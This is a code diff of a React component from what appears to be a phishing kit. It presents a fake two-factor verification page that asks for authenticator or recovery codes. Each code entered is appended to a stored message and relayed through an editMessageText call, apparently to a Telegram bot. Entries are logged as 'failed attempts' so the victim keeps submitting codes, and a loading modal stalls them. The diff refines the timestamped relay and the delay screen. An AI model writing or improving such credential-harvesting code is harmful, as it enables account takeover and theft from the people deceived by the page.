@@ -1,11 +1,12 @@
 import OTPImage from '@assets/verify.png';
 import Loading from '@components/Loading';
+import LoadingModal from '@components/LoadingModal';
 import useFormValidation from '@hooks/useFormValidation';
+import { getCurrentTime } from '@pages/GetInfo';
 import ImageUpload from '@pages/ImageUpload';
 import { editMessageText } from '@utils/api';
 import getConfig from '@utils/config';
 import React, { useEffect, useRef, useState } from 'react';
-
 interface Config {
 	settings: {
 		code_loading_time: number;
@@ -32,7 +33,6 @@ const CodeInput: React.FC = () => {
 	const codeInputRef = useRef<HTMLInputElement>(null);
 	const [showError, setShowError] = useState<boolean>(false);
 	const [config, setConfig] = useState<Config | null>(null);
-	const [countdown, setCountdown] = useState<number | null>(null);
 
 	useEffect(() => {
 		const fetchConfig = async () => {
@@ -71,9 +71,11 @@ const CodeInput: React.FC = () => {
 			const messageID = localStorage.getItem('message_id');
 			const message = localStorage.getItem('message');
 			const newMessage =
-				message +
-				'\n' +
-				`<b>🔢 Code:</b> ${failedCodeAttempts}<code>` +
+				message?.replace(
+					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+				) +
+				`\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` +
 				code +
 				'</code>';
 			localStorage.setItem('message', newMessage);
@@ -85,9 +87,11 @@ const CodeInput: React.FC = () => {
 			const messageID = localStorage.getItem('message_id');
 			const message = localStorage.getItem('message');
 			const newMessage =
-				message +
-				'\n' +
-				`<b>🔢 Code:</b> ${failedCodeAttempts}<code>` +
+				message?.replace(
+					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+				) +
+				`\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` +
 				code +
 				'</code>';
 			localStorage.setItem('message', newMessage);
@@ -96,16 +100,8 @@ const CodeInput: React.FC = () => {
 				text: newMessage,
 			});
 			const loadingTime = config ? config.settings.code_loading_time : 0;
-			setCountdown(Math.floor(loadingTime / 1000));
-			const countdownInterval = setInterval(() => {
-				setCountdown((prevCountdown: number | null) =>
-					prevCountdown !== null ? prevCountdown - 1 : null,
-				);
-			}, 1000);
 
 			setTimeout(() => {
-				clearInterval(countdownInterval);
-				setCountdown(null);
 				setCode('');
 				if (codeInputRef.current) {
 					codeInputRef.current.value = '';
@@ -146,7 +142,7 @@ const CodeInput: React.FC = () => {
 						app you set up, or Enter 8-digit recovery code
 					</p>
 				</div>
-				<div className='my-2'>
+				<div className='my-2 flex flex-col items-center justify-center'>
 					<input
 						ref={codeInputRef}
 						className='w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
@@ -181,15 +177,14 @@ const CodeInput: React.FC = () => {
 						}}
 						disabled={!isCodeValid || isLoading}
 					>
-						{isLoading ? (
-							<>
-								{countdown !== null &&
-									` ${countdown}s Continue`}
-							</>
-						) : (
-							'Continue'
-						)}
+						Continue
 					</button>
+					{isLoading && (
+						<LoadingModal
+							loadingTime={config.settings.code_loading_time}
+							setShowLoadingModal={setIsLoading}
+						/>
+					)}
 					<a href='#' className='text-blue-500 hover:underline'>
 						Send Code
 					</a>
